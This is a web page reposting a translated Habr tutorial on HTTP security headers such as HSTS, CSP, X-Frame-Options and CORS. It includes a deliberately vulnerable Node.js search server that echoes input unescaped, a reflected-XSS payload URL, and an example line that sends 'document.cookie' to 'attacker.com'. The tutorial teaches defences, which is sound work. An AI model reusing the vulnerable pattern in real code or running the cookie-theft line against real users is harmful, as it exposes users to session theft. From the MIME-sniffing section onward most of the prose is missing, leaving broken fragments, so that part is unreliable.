<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How to increase the security of web applications using HTTP headers</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="This is the third part of the web security series: the second part was ‚Äú Web Security: an introduction to HTTP ‚Äù, the first was ‚Äú How browsers work ‚Äî ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How to increase the security of web applications using HTTP headers</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/c8d/5c5/809/c8d5c5809e609fecf60c662139f248d2.jpg" alt="image"><br><br>  This is the third part of the web security series: the second part was ‚Äú <a href="https://habr.com/company/edison/blog/433288/">Web Security: an introduction to HTTP</a> ‚Äù, the first was ‚Äú <a href="https://habr.com/company/edison/blog/432870/">How browsers work ‚Äî an introduction to web application security</a> .‚Äù <br><br>  As we saw in the previous parts of this series, servers can send HTTP headers to provide the client with additional metadata in the response, in addition to sending the content requested by the client.  Clients are then allowed to specify how to read, cache, or protect a specific resource. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Currently, browsers have implemented a very wide range of security-related headers to make it more difficult for attackers to exploit vulnerabilities.  In this article, we will try to discuss each of them, explaining how they are used, what attacks they prevent, and a bit of history for each headline. <br><a name="habracut"></a><br><blockquote> <a href="https://www.edsd.com/" title="EDISON Software - web-development"><img align="left" width="153" height="75" src="https://habrastorage.org/webt/w0/zl/to/w0zltoxvysbr0yeinstkfvw1wbg.png" alt="EDISON Software - web-development"></a> <br clear="right">  The post was written with the support of the company EDISON Software, which <a href="https://www.edsd.com/about/blog/russian-software-developers-are-world-leaders">fights for the honor of Russian programmers</a> and <a href="https://www.edsd.com/about/blog/how-to-develop-software-for-a-microtomography-device-in-5-233-man-hours">shares</a> in detail <a href="https://www.edsd.com/about/blog/how-to-develop-software-for-a-microtomography-device-in-5-233-man-hours">their experience in developing complex software products</a> . </blockquote><h3>  HTTP Strict Transport Security (HSTS) </h3><br>  Since the end of 2012, it has become easier for supporters of ‚ÄúHTTPS Everywhere‚Äù to force the client to always use the secure version of the HTTP protocol thanks to Strict Transport Security: a very simple <code>Strict-Transport-Security: max-age=3600</code> tells the browser that within the next hour (3600 seconds) Must not communicate with the application using insecure protocols. <br><br>  When a user tries to access an application protected with HSTS via HTTP, the browser simply refuses to go further, automatically converting the <code>http://</code> URLs to <code>https://</code> . <br><br>  You can check it locally with the <a href="https://github.com/odino/wasec/tree/master/hsts">github.com/odino/wasec/tree/master/hsts</a> code.  You will need to follow the instructions in the README (it includes installing a trusted SSL certificate for <code>localhost</code> on your computer using the <a href="https://github.com/FiloSottile/mkcert">mkcert</a> tool), and then try opening <code>https://localhost:7889</code> . <br><br>  In this example, there are 2 servers: HTTPS, which is listening on <code>7889</code> , and HTTP is port <code>7888</code> .  When you access the HTTPS server, it will always try to redirect you to the HTTP version that will work because the HSTS is not on the HTTPS server.  If instead you add the <code>hsts=on</code> parameter to your URL, the browser will force the link to the <code>https://</code> version.  Since the server on the <code>7888</code> is only available via the http protocol, you will end up looking at a page that looks something like this. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/693/783/9e0/6937839e0473a7101847dfaba7a10a1d.png" alt="image"><br><br>  You may be interested to know what happens when a user visits your site for the first time, because the HSTS policy is not predetermined: attackers could potentially deceive the user according to <code>http://</code> version of your site and launch an attack there, so there is still room for problems .  This is a serious problem, since HSTS is a trust mechanism when first used.  He is trying to make sure that after visiting the website the browser knows that the subsequent interaction should use HTTPS. <br><br>  To circumvent this drawback could be through the support of a huge database of websites that support HSTS, which Chrome does through <a href="https://hstspreload.org/">hstspreload.org</a> .  You must first establish your policy, then visit the website and check if it can be added to the database.  For example, we can see that Facebook is on the list. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/6ce/40b/830/6ce40b8307fa218f0f6f5f8cb3ccdad9.png" alt="image"><br><br>  By submitting your website to this list, you can inform browsers in advance that your website uses HSTS, so even the first interaction between clients and your server will be done via a secure channel.  But it is expensive, because you really need to take part in HSTS.  If, for any reason, you want your website to be removed from the list, this is not an easy task for browser vendors: <br><blockquote>  Keep in mind that inclusion in the preload list cannot be easily canceled. <br><br>  Domains can be deleted, but it takes months to bring Chrome to users, and we cannot guarantee any other browsers.  Do not request inclusion to the list if you are not sure that you can support HTTPS for your entire site and all its subdomains for a long time. <br>  - Source: <a href="https://hstspreload.org/">https://hstspreload.org/</a> </blockquote>  This is because the provider cannot guarantee that all users will use the latest version of their browser, and your site will be removed from the list.  Think carefully and make a decision based on your degree of trust in the HSTS and your ability to sustain it in the long run. <br><br><h3>  HTTP Public Key Pinning (HPKP) </h3><br>  HTTP Public Key Pinning is a mechanism that allows us to tell the browser which SSL certificates to expect when connecting to our servers.  This header uses a trust mechanism for the first use, like HSTS, and means that after the client connects to our server, it will store certificate information for subsequent interactions.  If at some point the client finds out that the server is using a different certificate, it will politely refuse to connect, which makes it very difficult to conduct man-in-the-middle attacks (MITM). <br><br>  This is what the HPKP policy looks like: <br><br><pre> <code class="plaintext hljs">Public-Key-Pins: pin-sha256="9yw7rfw9f4hu9eho4fhh4uifh4ifhiu="; pin-sha256="cwi87y89f4fh4fihi9fhi4hvhuh3du3="; max-age=3600; includeSubDomains; report-uri="https://pkpviolations.example.org/collect"</code> </pre> <br>  The header declares which certificates the server will use (in this case, two of them), using the certificate hash, and includes additional information, such as the lifetime of this directive ( <code>max-age = 3600</code> ) and several other details.  Unfortunately, it makes no sense to dig deeper to understand what we can do with securing the public key, <a href="https://groups.google.com/a/chromium.org/forum/">because Chrome does not approve of this function</a> - a signal that its adoption is doomed to failure. <br><br>  Chrome‚Äôs solution is not irrational, it‚Äôs simply a consequence of the risks associated with securing the public key.  If you lose your certificate or simply make a mistake during testing, your site will be unavailable for users who have visited the site before (during the <code>max-age</code> directive, which usually takes a week or months). <br><br>  As a result of these potentially catastrophic consequences, the adoption of HPKP was extremely low, and there were cases <a href="https://www.smashingmagazine.com/be-afraid-of-public-key-pinning/">when large websites were not available due to improper configuration</a> .  With all this in mind, Chrome decided that users would be better off without the protection offered by HPKP, and <a href="https://scotthelme.co.uk/im-giving-up-on-hpkp/">security researchers are not entirely against this decision</a> . <br><br><h3>  Expect-CT </h3><br>  While HPKP was being condemned, a new header appeared to prevent fraudulent SSL certificates for clients: <code>Expect-CT</code> . <br><br>  The purpose of this header is to inform the browser that it must perform additional ‚Äúbackground checks‚Äù to make sure that the certificate is authentic: when the server uses the <code>Expect-CT</code> header, it basically asks the client to verify that the certificates used are in the open transparency certificate logs (CT). <br><br>  The certificate transparency initiative is an effort by Google to ensure: <br><blockquote>  An open platform for monitoring and auditing SSL certificates in near real time. <br><br>  In particular, the transparency of certificates allows you to detect SSL certificates that were erroneously issued by a certification authority or maliciously obtained from another flawless certification authority.  It also allows you to identify certification authorities that went to fraud and maliciously issue certificates. <br>  - Source: <a href="https://www.certificate-transparency.org/">https://www.certificate-transparency.org/</a> </blockquote>  The header takes this form: <br><br><pre> <code class="plaintext hljs">Expect-CT: max-age=3600, enforce, report-uri="https://ct.example.com/report"</code> </pre> <br>  In this example, the server asks for a browser: <br><br><ul><li>  enable CT check for the current application for 1 hour (3600 seconds) </li><li>  <code>enforce</code> enforce this policy and deny access to the application in case of violation </li><li>  send a report to the specified URL in case of violation </li></ul><br>  The goal of the Certificate Transparency initiative is to detect erroneously issued or malicious certificates (and fraudulent certification authorities) earlier, faster, and more accurately than any other method used before. <br><br>  By enabling the use of the <code>Expect-CT</code> header, you can use this initiative to improve the security status of your application. <br><br><h3>  X-Frame-Options </h3><br>  Imagine that you see a webpage like this <br><br><img src="https://habrastorage.org/getpro/habr/post_images/2f5/87f/f15/2f587ff15a4e613cc91e13122d49e22b.png" alt="image"><br><br>  As soon as you click on the link, you realize that all the money in your bank account has disappeared.  What happened? <br><br>  You have been the victim of a clickjacking attack. <br><br>  The attacker sent you to his website, which displays a very attractive link to click.  Unfortunately, he also embedded in your iframe page with <code>your-bank.com/transfer?amount=-1&amp;[attacker@gmail.com]</code> , but hid it by setting transparency to 0%.  We thought that we had clicked on the original page trying to win a completely new Hamer, but instead the browser fixed a click on the iframe, a dangerous click that confirmed the transfer of money. <br><br>  Most banking systems require you to enter a one-time PIN to confirm transactions, but your bank has not caught up with time, and all your money is gone. <br><br>  The example is quite extreme, but it should let you know what the consequences of an <a href="https://www.troyhunt.com/clickjack-attack-hidden-threat-right-in/">attack with clickjacking</a> might be.  The user intends to click on a specific link, while the browser will click on the ‚Äúinvisible‚Äù page, which was embedded in the frame. <br><br>  I have included an example of this vulnerability in <a href="https://github.com/odino/wasec/tree/master/clickjacking">github.com/odino/wasec/tree/master/clickjacking</a> .  If you run the example and try to click on the ‚Äúattractive‚Äù link, you will see that the real click is intercepted by the iframe, which makes it non-transparent so that you can more easily detect the problem.  The example should be available at <code><a href="">http://localhost:7888</a></code> . <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e11/a28/3a9/e11a283a9d4f69c80622666fdcc647c2.png" alt="image"><br><br>  Fortunately, browsers have come up with a simple solution to this problem: <code>X-Frame-Options</code> (XFO), which allows you to decide whether you can embed your application as an iframe on external websites.  Popularized by Internet Explorer 8, XFO was first introduced in 2009 and is still supported by all major browsers. <br><br>  It works like this: when the browser sees the iframe, it loads it and checks that its XFO allows it to be included in the current page before it is rendered. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/8c3/61e/04e/8c361e04e5a18bac008a106e47090dc1.png" alt="image"><br><br>  Supported values: <br><br><ul><li>  <code>DENY</code> : This webpage cannot be embedded anywhere.  This is the highest level of protection, since it does not allow anyone to embed our content. </li><li>  <code>SAMEORIGIN</code> : Only pages from the same domain as the current can insert this page.  This means that <code>example.com/embedder</code> can load <code>example.com/embedded</code> if its policy is set to <code>SAMEORIGIN</code> .  This is a more relaxed policy that allows owners of a particular website to embed their own pages into their application. </li><li>  <code>ALLOW-FROM uri</code> : attachment is allowed with the specified URI.  We could, for example, allow an external authorized website to embed our content using <code>ALLOW-FROM https://external.com</code> .  This is usually used when you are going to allow third-party developers to embed your content via iframe. </li></ul><br>  An example of an HTTP response that includes the strictest possible XFO policy is as follows: <br><br><pre> <code class="plaintext hljs">HTTP/1.1 200 OK Content-Type: application/json X-Frame-Options: DENY ...</code> </pre> <br>  To demonstrate how browsers behave when XFO is turned on, we can simply change our example URL to <code>http://localhost:7888 /?xfo=on</code> .  The <code>xfo=on</code> parameter tells the server to include <code>X-Frame-Options: deny</code> in the response, and we can see how the browser restricts access to the iframe: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ecf/751/7b7/ecf7517b7954476cacc64a7e3cb38d87.png" alt="image"><br><br>  XFO was considered the best way to prevent attacks using frame-based clicks until, after a few years, another heading entered the game ‚Äî Content Security Policy or CSP for short. <br><br><h3>  Content Security Policy (CSP) </h3><br>  The <code>Content-Security-Policy</code> header, abbreviated CSP, provides next-generation utilities to prevent multiple attacks, from XSS (cross-site scripting) to intercepting clicks (click-jacking). <br><br>  To understand how CSP helps us, you first need to think about the attack vector.  Suppose we just created our own search engine Google, where there is a simple input field with a submit button. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e92/afc/397/e92afc3972e0d40182d68544e8e51d5c.png" alt="image"><br><br>  This web application does nothing magical.  It is simple, <br><br><ul><li>  displays the form </li><li>  allows the user to perform a search </li><li>  displays search results along with the keyword that the user was searching for </li></ul><br>  When we perform a simple search, the application returns the following: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/5a7/977/79b/5a797779b4394913cbfef82a6e0dafe9.png" alt="image"><br><br>  Amazing  Our application incredibly understood our search and found a similar image.  If we delve into the source code available at <a href="https://github.com/odino/wasec/tree/master/xss">github.com/odino/wasec/tree/master/xss</a> , we will soon realize that the application is a security issue, because any keyword the user is looking for is directly printed in HTML: <br><br><pre> <code class="xml hljs">var qs = require('querystring') var url = require('url') var fs = require('fs') require('http').createServer((req, res) =&gt; { let query = qs.parse(url.parse(req.url).query) let keyword = query.search || '' let results = keyword ? `You searched for "${keyword}", we found:<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">br</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://placekitten.com/200/300"</span></span></span><span class="hljs-tag"> /&gt;</span></span>` : `Try searching...` res.end(fs.readFileSync(__dirname + '/index.html').toString().replace('__KEYWORD__', keyword).replace('__RESULTS__', results)) }).listen(7888) <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>Search The Web<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"search"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"__KEYWORD__"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"submit"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"results"</span></span></span><span class="hljs-tag">&gt;</span></span> __RESULTS__ <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  This represents an unpleasant consequence.  An attacker could create a specific link that executes arbitrary javascript in the victim‚Äôs browser. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/3ee/628/c3a/3ee628c3af5ea6176284c5451423957c.png" alt="image"><br><br>  If you have the time and patience to run the example locally, you can quickly understand the full power of CSP.  I added a query string parameter that includes CSP, so we can try to navigate to the malicious URL with CSP enabled: <br><blockquote>  <a href="http://localhost/">localhost</a> : 7888 /? search =% 3Cscript + type% 3D% 22text% 2Fjavascript% 22% 3Ealert% 28% 27You% 20have% 20been% 20PWNED% 27% 29% 3C% 2Fscript% 3E &amp; csp = on </blockquote><img src="https://habrastorage.org/getpro/habr/post_images/903/763/6a1/9037636a1b4baa19cced586860caa993.png" alt="image"><br><br>  As you can see in the example above, we told the browser that our CSP policy only allows scripts included from the same source of the current URL, which we can easily check by accessing the URL using curl and viewing the response header: <br><br><pre> <code class="plaintext hljs">$ curl -I "http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E&amp;csp=on" HTTP/1.1 200 OK X-XSS-Protection: 0 Content-Security-Policy: default-src 'self' Date: Sat, 11 Aug 2018 10:46:27 GMT Connection: keep-alive</code> </pre> <br>  Since the XSS attack was carried out using an embedded script (a script directly embedded in the HTML content), the browser politely refused to execute it, ensuring the security of our user.  Imagine that instead of simply displaying a warning dialog, an attacker would set up a redirect to his own domain through some JavaScript code that might look like this: <br><br><pre> <code class="plaintext hljs">window.location = `attacker.com/${document.cookie}`</code> </pre> <br>  They could steal all user cookies that may contain very sensitive data (more on this in the next article). <br><br>  It should be clear by now how CSP helps us prevent a number of attacks on web applications.  You define a policy, and the browser will strictly adhere to it, refusing to launch resources that violate the policy. <br><br>  An interesting option for CSP is report-only mode.  Instead of using the <code>Content-Security-Policy</code> header, you can first check the impact of the CSP on your site, telling the browser to simply report errors without blocking the execution of the script, etc., using the <code>Content-Security-Policy-Report-Only</code> header. <br><br>  The reports will allow you to understand what critical changes may be caused by the CSP policy you would like to deploy and fix them accordingly.  We can even specify the URL of the report, and the browser will send us a report.  Here is a complete report-only policy example: <br><br><pre> <code class="plaintext hljs">Content-Security-Policy: default-src 'self'; report-uri http://cspviolations.example.com/collector</code> </pre> <br>  CSP policies themselves can be a bit complicated, for example, in the following example: <br><br><pre> <code class="plaintext hljs">Content-Security-Policy: default-src 'self'; script-src scripts.example.com; img-src *; media-src medias.example.com medias.legacy.example.com</code> </pre> <br>  This policy defines the following rules: <br><br><ul><li>  executable scripts (for example, JavaScript) can only be downloaded from <code>scripts.example.com</code> </li><li>  images can be downloaded from any source ( <code>img-src: *</code> ) </li><li>  video or audio content can be downloaded from two sources: <code>medias.example.com</code> and <code>medias.legacy.example.com</code> </li></ul><br>  As you can see, a politician can be many, and if we want to provide maximum protection for our users, this can be a rather tedious process.  However, writing a comprehensive CSP policy is an important step towards adding an extra layer of security to our web applications. <br><br>  For more information on CSP, I would recommend <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a> . <br><br><h3>  X-XSS-Protection </h3><br>  Although it is replaced by CSP, the <code>X-XSS-Protection</code> header provides a similar type of protection.  This header is used to mitigate XSS attacks in older browsers that do not fully support CSP.  This title is not supported by Firefox. <br><br>  Its syntax is very similar to what we just saw: <br><br><pre> <code class="plaintext hljs">X-XSS-Protection: 1; report=http://xssviolations.example.com/collector</code> </pre> <br>  Reflected XSS is the most common type of attack, where the entered text is printed by the server without any verification, and this is where this header really resolves.  If you want to see it yourself, I would recommend trying the example at <a href="https://github.com/odino/wasec/tree/master/xss">github.com/odino/wasec/tree/master/xss</a> , since adding <code>xss=on</code> to the URL, it shows what the browser does when XSS protection is on .  If we enter a malicious string in the search field, such as, the browser will politely refuse to execute the script and explain the reason for its decision: <br><br><pre> <code class="plaintext hljs">The XSS Auditor refused to execute a script in 'http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=on' because its source code was found within the request. The server sent an 'X-XSS-Protection' header requesting this behavior.</code> </pre> <br>  Even more interesting is the default behavior in Chrome, when a CSP or XSS policy is not specified on a webpage.  The script that we can test by adding the <code>xss=off</code> parameter to our URL ( <code>http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=off</code> ): <br><br><img src="https://habrastorage.org/getpro/habr/post_images/938/8c4/6fd/9388c46fd9f6c9370d0f9ff3b2a65210.png" alt="image"><br><br>  Surprisingly, Chrome is careful to prevent the page from being rendered, making it difficult to create a reflected XSS.  It is impressive how far the browsers have gone. <br><br><h3>  Feature policy </h3><br>  In July 2018, security researcher <a href="https://scotthelme.co.uk/">Scott Helm</a> posted a very interesting <a href="https://scotthelme.co.uk/a-new-security-header-feature-policy/">blog post</a> that details the new security headline: <code>Feature-Policy</code> . <br><br>  Currently supported by very few browsers (Chrome and Safari at the time of this writing), this header allows us to determine if a particular browser feature is enabled on the current page.  With a syntax very similar to CSP, we should have no problems understanding what the policy of functions means, such as the following: <br><br><pre> <code class="plaintext hljs">Feature-Policy: vibrate 'self'; push *; camera 'none'</code> </pre> <br>  If we have all the doubts, then how does this policy affect the browser API, we can simply analyze it: <br><br><ul><li>  <code>vibrate 'self'</code> : allows the current page to use the vibration API and any frame on the current site. </li><li>  <code>push *</code> : the current page and any frame can use the push notification API </li><li>  <code>camera 'none'</code> : access to the camera API is denied on this page and any frames. </li></ul><br>  The policy of functions has a small history.  If your site allows users to, for example, take selfies or record audio, it would be very useful to use a policy that restricts access to the API through your page in other contexts. <br><br><h3>  X-Content-Type-Options </h3><br>  Sometimes smart browser features end up harming us from a security point of view.  A prime example is MIME sniffing, a technique popular in Internet Explorer. <br><br> MIME- ‚Äî       ( )    . ,      <code>/awesome-picture.png</code> ,          (, <code>Content-Type: text/plain</code> ).     ,       . <br><br>    , IE   ,    MIME-:     ¬´¬ª  ,  ,      ,      <code>Content-Type</code> ,   ,  ,       ,  . <br><br>     -,       ,  ,     <code>/test.jpg</code> ,   JavaScript. ,   ?    ,       HTML ,     ,   ¬´¬ª,     .    ,  ,   ,      . <br><br>    ,     <code>X-Content-Type-Options: nosniff</code> ,    MIME-:     ,   ,           ,       .  ,   ,       ,       . <br><br><h3> Cross-Origin Resource Sharing (CORS) </h3><br>    JavaScript HTTP-      .  , AJAX-  <code>example.com</code>     <code>example.com</code> . <br><br>    ,         ‚Äî  cookie,       . ,       <code>win-a-hummer.com</code> ,     AJAX  <code>your-bank.com</code> .     - ,    HTTP-    ,    ,   ,    . <br><br>         AJAX   ,        Cross Origin Resource Sharing (CORS),  ,     . <br><br> ,    CORS,  ,        ,     ¬´¬ª  CORS. <br><br> ,       ,  ,     <code>Access-Control-Allow-Origin</code>    , ,       . <br><br>       <code>Access-Control-Allow-Origin: *</code> ,         ,     ,   URL-,       ,   <code>Access-Control-Allow-Origin: https://example.com</code> . <br><br>        <a href="https://github.com/odino/wasec/tree/master/cors">github.com/odino/wasec/tree/master/cors</a> ,  ,         .   ,    AJAX  <code>test-cors</code>  <code>test-cors-2</code>      .   test-cors-2    CORS,   ,   .    <code>http://cors-test:7888/?cors=on</code> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/bae/c57/e2f/baec57e2f48c17748ce2d6202985c559.png" alt="image"><br><br>      <code>cors</code>  URL,         : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/68d/3aa/ae1/68d3aaae10cb6f226ae1c0a1c9a96d27.png" alt="image"><br><br>  ,    ,   ,    ,        .   ,        ,          . , ,       ,    <code>my-bank.com/transfer?amount=1000&amp;from=me&amp;to=attacker.</code>    ! <br><br>       , <code>GET</code> -   ,   ,     <code>POST</code> -?  ,      ,     ,    <code>http://cors-test:7888/?method=POST</code> : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e73/f4e/9a0/e73f4e9a003a2cb60cf6c952bc8d21e6.png" alt="image"><br><br>      <code>POST</code> ,        ,    ¬´ ¬ª.    ,   <code>OPTIONS</code>     ,    .       ,    ,    <code>POST</code>    . <br><br>     : <br><br><ul><li> CORS ‚Äî    .   ,     ,         ,   . </li><li>    API,     <code>GET</code> .        ,     . </li></ul><br>    ,        -,       ,    ,     CORS.  ,   ,   <code>example.com</code> ,     <code>example.com/_proxy/other.com</code> ,    ,   <code>_proxy/other.com/*</code> ,    <code>other.com</code> . <br><br>       , ,       CORS,  MDN    ,       <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a> . <br><br><h3> X-Permitted-Cross-Domain-Policies </h3><br>    CORS, <code>X-Permitted-Cross-Domain-Policies</code>       Adobe ( , Flash  Acrobat). <br><br>      ,    ,      .  ,  Adobe      <code>crossdomain.xml</code>    ,    ,  <code>X-Permitted-Cross-Domain-Policies</code>       . <br><br>  ?      <code>X-Permitted-Cross-Domain-Policies: none</code>   ,       Flash. <br><br><h3> Referrer-Policy </h3><br>      , ,      .   <code>Referer</code> ,       .     URL     ,   . <br><br> ,  ,      .    ,     .   <code>Referer</code>        .    ,    ,              . <br><br>  <code>Referrer-Policy</code> ,    2017         ,        ,  ,      URL-   <code>Referer</code>     . <br><br>      ,    <code>Referrer-Policy</code> : <br><br><ul><li> <code>no-referrer</code> :  <code>Referer</code>    </li><li> <code>origin</code> :  <code>https://example.com/private-page</code>  <code>https://example.com/</code> </li><li> <code>same-origin</code> :  <code>Referer</code>    ,       </li></ul><br>  ,      <code>Referred-Policy</code> ( <code>strict-origin</code> , <code>no-referrer-when-downgrade</code>  . .),  ,    , ,      .       ,    ,  <a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project">     OWASP</a> . <br><br>  <code>Origin</code>    <code>Referer</code> ,        ,  ,          .  <code>Origin</code>  ,       .             -:  <code>Origin</code>     ,   . <br><br>   ,   HTTP-,   cURL,     :  c <code>url -H "Origin: example.com" api.example.com</code>        origin ‚Ä¶‚Ä¶         <code>Origin</code> ( <code>Referer</code> ,     )        . <br><br><h3>    </h3><br>        <a href="https://securityheaders.com/">securityheaders.com</a> ,   -,    ,    -   ,   .  ,    URL,         .  <a href="https%253A%252F%252Ffacebook.com%26followRedirects%3Don">   facebook.com</a> : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/8dd/8ef/5a6/8dd8ef5a6215f292b95bfae1b9c8ef16.png" alt="image"><br><br>     ,   , securityheaders.com ‚Äî  ,    . <br><br><h3> HTTP   :     cookie </h3><br>           HTTP,     ,     -      ,       . <br><br>  <a href="http-cookies-be8d8d8016e1"> </a>           HTTP: . <br><br>   ,   -   HTTP   , , ,  ( )         -:     - ,     ,     ¬´   ¬ª.   ,  cookie       ,           . </div><p>Source: <a href="https://habr.com/ru/post/434228/">https://habr.com/ru/post/434228/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../434218/index.html">Simple Java bot-clicker on the example of the game World of Warcraft 3.3.5a</a></li>
<li><a href="../434220/index.html">Logging into Aeronet: running a standalone quadrocopter in a virtual environment</a></li>
<li><a href="../434222/index.html">Amazon ground station for rent - receiving and processing data from satellites</a></li>
<li><a href="../434224/index.html">Digital events in Moscow from December 24 to 30</a></li>
<li><a href="../434226/index.html">Habrautilitis for the collection of habrastatistiki</a></li>
<li><a href="../434230/index.html">Presentation of GOM Atos 5 / 5X 3D scanners at Top 3D Expo</a></li>
<li><a href="../434234/index.html">Swimming track method</a></li>
